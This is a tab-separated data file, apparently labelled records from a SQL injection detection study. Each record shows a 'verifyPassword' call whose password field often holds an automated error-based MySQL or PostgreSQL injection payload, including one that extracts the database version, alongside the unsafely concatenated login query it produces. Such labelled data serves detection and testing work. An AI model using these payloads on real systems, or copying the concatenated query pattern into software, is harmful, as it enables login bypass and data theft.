SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---405" OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND "PcZj"="PcZj	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-405" OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND "PcZj"="PcZj';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---6094	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-6094';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---1355") OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ("Luts" LIKE "Luts	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-1355") OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ("Luts" LIKE "Luts';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---2235	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-2235';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---9929")) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND (("BzUP" LIKE "BzUP	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-9929")) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND (("BzUP" LIKE "BzUP';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---8903	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-8903';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---9530"))) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ((("zEgL" LIKE "zEgL	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-9530"))) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ((("zEgL" LIKE "zEgL';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---9640	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-9640';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---8968" OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND "rZgw" LIKE "rZgw	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-8968" OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND "rZgw" LIKE "rZgw';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---4014	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-4014';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---6553) OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-6553) OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---6345	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-6345';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---4270') OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-4270') OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---6989	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-6989';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---8470' OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-8470' OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---9720	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-9720';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---2331" OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-2331" OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---2189	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-2189';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---3983) OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (7317=7317	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-3983) OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (7317=7317';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---1913	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-1913';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---4104)) OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ((2936=2936	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-4104)) OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ((2936=2936';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---8242	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-8242';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---2762))) OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (((1073=1073	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-2762))) OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (((1073=1073';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---7218	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-7218';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---3938 OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-3938 OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC)';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---4473	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-4473';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---4680') OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ('kGMl'='kGMl	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-4680') OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ('kGMl'='kGMl';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---965	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-965';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---3563')) OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (('bRRz'='bRRz	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-3563')) OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND (('bRRz'='bRRz';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---8245	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-8245';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---2998'))) OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ((('LjhU'='LjhU	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-2998'))) OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND ((('LjhU'='LjhU';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---6731	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-6731';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---11' OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND 'poiG'='poiG	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-11' OR 226=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (226=226) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND 'poiG'='poiG';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---846' OR 8653=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (6::int=6) THEN CHR(49) ELSE CHR(48) END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND 'LDtd'='LDtd	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-846' OR 8653=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (6::int=6) THEN CHR(49) ELSE CHR(48) END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND 'LDtd'='LDtd';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---2161' OR 1942=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (COALESCE(6, NULL)=6) THEN CHR(49) ELSE CHR(48) END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND 'VWCV'='VWCV	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-2161' OR 1942=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (COALESCE(6, NULL)=6) THEN CHR(49) ELSE CHR(48) END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND 'VWCV'='VWCV';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---9059' OR 7262=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT COALESCE(CAST(VERSION() AS CHARACTER(10000)),CHR(32)))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND 'bMWV'='bMWV	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-9059' OR 7262=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT COALESCE(CAST(VERSION() AS CHARACTER(10000)),CHR(32)))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND 'bMWV'='bMWV';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---3648' OR 860=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (2=(SELECT DIV(6, 3))) THEN CHR(49) ELSE CHR(48) END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND 'WDym'='WDym	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-3648' OR 860=CAST(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (2=(SELECT DIV(6, 3))) THEN CHR(49) ELSE CHR(48) END))::text||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58) AS NUMERIC) AND 'WDym'='WDym';	sqlInjection--KEY_VALUE_SEPARATOR--true
